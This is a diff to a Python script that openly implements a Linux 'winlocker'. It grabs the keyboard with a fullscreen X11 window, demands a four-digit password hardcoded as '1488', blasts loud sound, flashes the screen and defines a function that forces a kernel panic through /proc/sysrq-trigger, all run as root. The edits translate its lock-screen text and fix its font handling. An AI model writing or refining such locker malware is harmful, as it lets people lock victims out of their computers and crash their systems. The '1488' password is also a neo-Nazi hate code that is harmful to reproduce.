@@ -11,18 +11,14 @@ PASSWORD = "1488"
 MAX_ATTEMPTS = 3
 attempts_left = MAX_ATTEMPTS
 
-# ---------- Громкий звук ----------
 def play_loud_sound():
     subprocess.run(["amixer", "set", "Master", "100%"], capture_output=True)
-    # Можно заменить на любой громкий .wav, если путь отличается:
     subprocess.run(["aplay", "/usr/share/sounds/alsa/Front_Center.wav"], capture_output=True)
 
-# ---------- Уничтожение системы ----------
 def trigger_kernel_panic():
     with open("/proc/sysrq-trigger", "w") as f:
         f.write("c")
 
-# ---------- Захват экрана и клавиатуры через X11 ----------
 class GrabLocker:
     def __init__(self):
         self.display = Display()
@@ -31,17 +27,12 @@ class GrabLocker:
         self.width = self.screen.width_in_pixels
         self.height = self.screen.height_in_pixels
 
-        # Получаем colormap для экрана
         self.colormap = self.screen.default_colormap
-
-        # Цвета (пиксели)
         self.color_black = self.screen.black_pixel
-        # Получаем зелёный, красный, белый через colormap
         self.color_green = self.colormap.alloc_color(0, 65535, 0).pixel
         self.color_red = self.colormap.alloc_color(65535, 0, 0).pixel
         self.color_white = self.colormap.alloc_color(65535, 65535, 65535).pixel
 
-        # Создаём чёрное полноэкранное окно
         self.window = self.root.create_window(
             0, 0, self.width, self.height, 0,
             self.screen.root_depth,
@@ -54,23 +45,25 @@ class GrabLocker:
         self.window.map()
         self.display.flush()
 
-        # Захватываем клавиатуру
         self.window.grab_keyboard(
             True, X.GrabModeAsync, X.GrabModeAsync, X.CurrentTime
         )
         self.display.flush()
 
-        # Графический контекст
         self.gc = self.window.create_gc(
             foreground=self.color_green,
             background=self.color_black,
         )
 
+        # Шрифт: сначала пробуем fixed, потом cursor (есть всегда)
+        self.font = self.display.open_font("fixed")
+        if not self.font:
+            self.font = self.display.open_font("cursor")
+
         self.input_buffer = ""
         self.running = True
 
     def draw_text(self, text, y, color="green"):
-        """Рисует строку по центру."""
         if color == "green":
             self.gc.change(foreground=self.color_green)
         elif color == "red":
@@ -80,23 +73,23 @@ class GrabLocker:
         else:
             self.gc.change(foreground=self.color_green)
 
-        font = self.display.open_font("fixed")
-        self.window.draw_text(font, self.gc, self.width//2 - 200, y, text.encode())
+        # Текст должен быть латиницей (ASCII), кодируем в Latin-1
+        text_bytes = text.encode("latin-1")
+        self.window.draw_text(self.font, self.gc, self.width//2 - 200, y, text_bytes)
         self.display.flush()
 
     def redraw_screen(self):
         self.window.clear_area(0, 0, self.width, self.height)
 
-        self.draw_text("ВЫ ПОПАЛИ НА ВИНЛОК. УГАДАЙТЕ ПАРОЛЬ У ВАС 3 ПОПЫТКИ", 50, "green")
-        self.draw_text("(четырёхзначный пароль)", 90, "green")
-        self.draw_text(f"ОСТАЛОСЬ {attempts_left} ПОПЫТКИ", 140, "green")
+        self.draw_text("YOU ARE LOCKED. GUESS 4-DIGIT PASSWORD", 50, "green")
+        self.draw_text(f"ATTEMPTS LEFT: {attempts_left}", 100, "green")
 
         stars = "*" * len(self.input_buffer)
-        self.draw_text(f"> {stars}", 200, "green")
+        self.draw_text(f"> {stars}", 150, "green")
 
         keys = ["1 2 3", "4 5 6", "7 8 9", "   0"]
         for i, line in enumerate(keys):
-            self.draw_text(line, 260 + i*40, "green")
+            self.draw_text(line, 210 + i*40, "green")
 
     def start(self):
         self.redraw_screen()
@@ -142,8 +135,8 @@ class GrabLocker:
 
     def flash_screen(self):
         for i in range(10):
-            color_pixel = self.color_red if i % 2 == 0 else self.color_white
-            self.window.change_attributes(background_pixel=color_pixel)
+            pixel = self.color_red if i % 2 == 0 else self.color_white
+            self.window.change_attributes(background_pixel=pixel)
             self.display.flush()
             time.sleep(0.1)
         self.window.change_attributes(background_pixel=self.color_black)
@@ -156,7 +149,7 @@ class GrabLocker:
 
 if __name__ == "__main__":
     if os.geteuid() != 0:
-        print("Запустите скрипт с правами root (sudo).")
+        print("Run as root (sudo).")
         sys.exit(1)
     locker = GrabLocker()
     locker.start()
